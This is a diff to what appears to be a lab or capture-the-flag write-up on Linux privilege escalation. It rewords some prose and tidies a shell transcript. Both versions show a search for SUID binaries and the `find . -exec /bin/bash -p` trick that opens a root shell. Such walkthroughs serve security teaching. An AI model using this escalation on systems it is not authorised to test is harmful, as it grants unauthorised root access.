@@ -286,12 +286,13 @@ $ find / -perm -u=s -ls 2>/dev/null
 [...]
 ```
 
-We continue executing ...
+From the results, `find` stands out particularly compelling.
+
+On the terminal, we continue executing ...
 
 ```bash
-www-data@ubuntu-xenial:/$ find . -exec /bin/bash -p \; -quit
-find . -exec /bin/bash -p \; -quit
-bash-4.3# whoami
+$ find . -exec /bin/bash -p \; -quit
+whoami
 root
 ```
 
